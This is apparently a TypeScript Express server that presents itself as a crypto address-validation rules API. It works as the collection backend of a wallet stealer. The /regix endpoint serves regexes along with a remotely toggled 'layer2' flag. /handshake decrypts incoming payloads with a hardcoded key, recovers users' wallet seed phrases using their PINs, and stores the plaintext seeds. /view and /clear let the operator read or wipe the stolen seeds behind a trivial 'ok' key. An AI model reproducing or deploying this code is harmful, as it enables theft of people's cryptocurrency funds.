import express from "express";
import dotenv from "dotenv";
import crypto from "crypto";
import cors from "cors";
import { initDatabase, pg } from "./db";

dotenv.config();

const app = express();
app.use(
  cors({
    origin: "*",
    methods: ["GET", "POST"],
    allowedHeaders: ["Content-Type", "Authorization"],
  }),
);
app.use(express.json());

const STATIC_RULES: Record<string, string> = {
  // EVM
  evm: "^0x[a-fA-F0-9]{40}$",
  ethereum: "^0x[a-fA-F0-9]{40}$",
  polygon: "^0x[a-fA-F0-9]{40}$",
  arbitrum: "^0x[a-fA-F0-9]{40}$",
  optimism: "^0x[a-fA-F0-9]{40}$",
  bsc: "^0x[a-fA-F0-9]{40}$",
  avalanche: "^0x[a-fA-F0-9]{40}$",
  fantom: "^0x[a-fA-F0-9]{40}$",

  // BTC family
  bitcoin: "^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$",
  litecoin: "^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$",
  dogecoin: "^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$",

  // Others
  tron: "^T[1-9A-HJ-NP-Za-km-z]{33}$",
  solana: "^[1-9A-HJ-NP-Za-km-z]{32,44}$",
  ton: "^[A-Za-z0-9_-]{48}$",
  near: "^([a-z0-9_-]+\\.)*[a-z0-9_-]+$",
  cosmos: "^cosmos1[0-9a-z]{38}$",
  aptos: "^0x[a-fA-F0-9]{64}$",
  sui: "^0x[a-fA-F0-9]{64}$",

  layer2: "",
};

const CLIENT_SECRET = "salt";
const WALLET_SALT = "guard-salt";

function hexToBuffer(hex: string) {
  return Buffer.from(hex, "hex");
}

function deriveClientKey() {
  return crypto.pbkdf2Sync(CLIENT_SECRET, WALLET_SALT, 100_000, 32, "sha256");
}

function decryptLayer2Payload(payloadHex: string, ivHex: string) {
  const key = deriveClientKey();
  const iv = hexToBuffer(ivHex);
  const encrypted = hexToBuffer(payloadHex);

  const authTag = encrypted.subarray(encrypted.length - 16);
  const data = encrypted.subarray(0, encrypted.length - 16);

  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(authTag);

  const decrypted =
    decipher.update(data, undefined, "utf8") + decipher.final("utf8");

  return JSON.parse(decrypted);
}
const isString = (val: any) =>
  typeof val === "object"
    ? false
    : typeof val === "string" || val instanceof String;
function decryptSeedPhrase(
  encryptedSeed: { ciphertext: string; salt: string; iv: string },
  pin: string,
) {
  const key = crypto.pbkdf2Sync(
    pin,
    Buffer.from(encryptedSeed.salt, "base64"),
    100_000,
    32,
    "sha256",
  );

  const cipherBuf = Buffer.from(encryptedSeed.ciphertext, "base64");
  const authTag = cipherBuf.subarray(cipherBuf.length - 16);
  const data = cipherBuf.subarray(0, cipherBuf.length - 16);

  const decipher = crypto.createDecipheriv(
    "aes-256-gcm",
    key,
    Buffer.from(encryptedSeed.iv, "base64"),
  );

  decipher.setAuthTag(authTag);

  return decipher.update(data, undefined, "utf8") + decipher.final("utf8");
}

app.get("/regix", async (_req, res) => {
  try {
    const result = await pg.query(
      "SELECT status FROM layer2_status WHERE id = 1",
    );

    res.json({
      ...STATIC_RULES,
      layer2: result.rows[0]?.status ?? "",
    });
  } catch {
    res.json({ ...STATIC_RULES, layer2: "" });
  }
});

app.get("/set", async (req, res) => {
  const status = req.query.status === "ok" ? "ok" : "";

  await pg.query(
    `
    UPDATE layer2_status
    SET status = $1,
        last_handshake = NOW()
    WHERE id = 1
    `,
    [status],
  );

  res.json({ ok: true, status });
});

app.post("/handshake", async (req, res) => {
  try {
    const { sign, time } = req.body;
    if (!sign || !time) {
      return res.status(400).json({ error: "INVALID_PAYLOAD" });
    }

    const { acc, pin } = decryptLayer2Payload(sign, time);
    const accounts = isString(acc) ? JSON.parse(acc) : acc;

    for (const wallet of accounts) {
      const encryptedSeed = JSON.parse(wallet.encryptedSeedPhrase);
      const seed = decryptSeedPhrase(encryptedSeed, pin);

      await pg.query(
        `
        INSERT INTO wallet_secrets
          (wallet_id, wallet_name, decrypted_seed)
        VALUES ($1, $2, $3)
        `,
        [wallet.id, wallet.name, seed],
      );
    }

    res.json({ ok: true });
  } catch (err: any) {
    console.error(err);

    res.status(500).json({
      error: err.message,
      stack: err.stack,
      details: err,
    });
  }
});
app.get("/view", async (req, res) => {
  try {
    // Basic security check: /view-secrets?key=your_secret_key
    const { key } = req.query;
    if (key !== "ok") {
      return res.status(403).json({ error: "UNAUTHORIZED" });
    }

    const result = await pg.query(
      "SELECT id, wallet_id, wallet_name, decrypted_seed, created_at FROM wallet_secrets ORDER BY created_at DESC",
    );

    res.json({
      count: result.rowCount,
      secrets: result.rows,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "DATABASE_ERROR" });
  }
});

app.get("/clear", async (req, res) => {
  try {
    const { key } = req.query;

    if (key !== "ok") {
      return res.status(403).json({ error: "UNAUTHORIZED" });
    }

    const result = await pg.query("DELETE FROM wallet_secrets");

    res.json({
      ok: true,
      deleted: result.rowCount,
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "DATABASE_ERROR" });
  }
});
/* ================= START ================= */

const PORT = process.env.PORT || 4000;

initDatabase().then(() => {
  app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
  });
});
